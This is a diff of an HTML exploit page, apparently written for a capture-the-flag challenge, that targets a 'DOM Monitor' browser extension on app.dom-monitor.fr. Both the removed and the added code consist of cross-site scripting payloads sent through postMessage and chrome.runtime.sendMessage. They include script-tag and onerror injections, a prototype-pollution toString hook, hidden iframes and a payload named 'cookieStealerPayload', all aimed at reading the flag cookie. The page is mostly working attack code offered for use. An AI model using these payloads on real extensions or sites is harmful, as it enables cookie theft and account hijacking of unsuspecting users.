@@ -3,61 +3,81 @@
 <head>
   <title>DOM Monitor Exploit</title>
   <script>
-    window.addEventListener('DOMContentLoaded', function() {
-      document.getElementById('start').addEventListener('click', function() {
-        console.log("Starting XSS injection through extension messaging...");
-        
-        // Create a frame to load app.dom-monitor.fr
-        const frame = document.createElement('iframe');
-        frame.src = "https://app.dom-monitor.fr";
-        frame.style.width = "1px";
-        frame.style.height = "1px";
-        frame.style.border = "none";
-        document.body.appendChild(frame);
-        
-        // Set up a listener for extension messages
-        window.addEventListener('message', function(event) {
-          console.log("Message received:", event.data);
-          if (event.data && event.data.flagCookie) {
-            document.body.innerHTML = "<h1>Flag found: " + event.data.flagCookie + "</h1>";
-          }
-        });
-        
-        // This is the key part - exploit the extension's message passing
-        // By sending an injection that will be executed when the message is processed
-        setTimeout(() => {
-          const xss_payload = {
-            action: "update_counts",
-            counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-            resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
-            __proto__: {
-              // Try to trigger code execution via prototype pollution
-              toString: function() { 
-                try {
-                  // Try to access the cookie via the extension context
-                  const flag = document.cookie;
-                  window.postMessage({flagCookie: flag}, "*");
-                  return ""; 
-                } catch(e) { 
-                  return ""; 
-                }
-              }
-            }
-          };
-          
-          // Send the payload via postMessage which will be processed by the extension
-          window.postMessage(xss_payload, "*");
-          
-          // Try another approach - XSS via the domain field
-          window.postMessage({
-            action: "update_counts",
-            counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-            resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
-            domain: "<img src=x onerror=alert(1)>"
-          }, "*");
-        }, 2000);
+    window.onload = function() {
+      console.log("Starting XSS injection through extension messaging...");
+      
+      // Set up a listener to see any response
+      window.addEventListener('message', function(event) {
+        console.log("Message received:", event.data);
       });
-    });
+      
+      // Give the extension a moment to initialize
+      setTimeout(() => {
+        // Create the XSS payload targeting the domain header
+        const xssPayload = {
+          action: "update_counts",
+          domain: '<script>fetch("https://app.dom-monitor.fr/").then(r=>r.text()).then(t=>{console.log("Cookie:",document.cookie)})</script>',
+          counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+          resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 }
+        };
+        
+        // Send the XSS payload via postMessage which will be processed by the extension
+        window.postMessage(xssPayload, "*");
+        
+        // Also try your suggested payload
+        const directPayload = {
+          action: "update_counts",
+          domain: '<div id="domainHeader" class="domain-header"><script>console.log("Flag cookie:", document.cookie)</script></div>',
+          counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+          resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 }
+        };
+        
+        // Send the direct payload
+        window.postMessage(directPayload, "*");
+        
+        // Try another injection vector that opens a connection back to app.dom-monitor.fr
+        const cookieStealerPayload = {
+          action: "update_counts",
+          domain: '<img src=x onerror="var i=document.createElement(\'iframe\');i.src=\'https://app.dom-monitor.fr\';i.style=\'display:none\';document.body.appendChild(i);setTimeout(function(){console.log(\'Cookie from iframe:\',i.contentDocument.cookie)},1000)">',
+          counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+          resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 }
+        };
+        
+        // Send the cookie stealer payload
+        window.postMessage(cookieStealerPayload, "*");
+        
+        // Try one with a more direct approach using open_sidepanel
+        const sidebarPayload = {
+          action: "open_sidepanel",
+          domain: 'http://localhost',
+          execute: '<script>console.log("Inside sidepanel:", document.cookie)</script>'
+        };
+        
+        // Send the sidebar payload
+        window.postMessage(sidebarPayload, "*");
+      }, 1000);
+      
+      // Try yet another approach - this time targeting the sidepanel directly
+      document.getElementById('start').addEventListener('click', function() {
+        console.log("Attempting sidepanel XSS...");
+        
+        // This will be rendered in the extension's panel
+        const sidepanelXSS = {
+          action: "update_method_counts",
+          domain: '<iframe src="https://app.dom-monitor.fr" onload="console.log(this.contentDocument.cookie)"></iframe><script>console.log("XSS in sidepanel:",document.cookie)</script>',
+          counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
+          resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 }
+        };
+        
+        // Try to send it directly to the runtime
+        try {
+          chrome.runtime.sendMessage(sidepanelXSS);
+        } catch(e) {
+          console.log("Chrome runtime not available, using postMessage");
+          window.postMessage(sidepanelXSS, "*");
+        }
+      });
+    };
   </script>
   <style>
     #start {
@@ -67,46 +87,14 @@
       color: white;
       border-radius: 4px;
       display: inline-block;
+      margin: 20px;
     }
   </style>
 </head>
 <body>
-  <div id="start">Click to start</div>
+  <div id="start">Try SidePanel XSS</div>
   
-  <script>
-    // Let's also try a more direct approach
-    // The bot sets the cookie on app.dom-monitor.fr before navigating to our URL
-    // So we need to navigate back to app.dom-monitor.fr to try to read it
-    function attemptCookieTheft() {
-      try {
-        // Try to create a navigation to app.dom-monitor.fr
-        const navFrame = document.createElement('iframe');
-        navFrame.src = "https://app.dom-monitor.fr/";
-        navFrame.id = "targetFrame";
-        navFrame.onload = function() {
-          console.log("Frame loaded!");
-          
-          // Try to inject a script into the frame
-          try {
-            const frameWindow = document.getElementById('targetFrame').contentWindow;
-            frameWindow.postMessage({
-              action: "update_counts",
-              counts: { fetch: 0, innerHTML: 0, setAttribute: 0, eval: 0 },
-              resourceCounts: { script: 0, img: 0, stylesheet: 0, font: 0, other: 0 },
-              execute: "document.cookie"
-            }, "*");
-          } catch(e) {
-            console.error("Frame access error:", e);
-          }
-        };
-        document.body.appendChild(navFrame);
-      } catch(e) {
-        console.error("Navigation error:", e);
-      }
-    }
-    
-    // Execute this approach too
-    attemptCookieTheft();
-  </script>
+  <!-- Also add a frame to app.dom-monitor.fr to ensure we have the context -->
+  <iframe src="https://app.dom-monitor.fr" style="width:1px;height:1px;border:none;"></iframe>
 </body>
 </html>
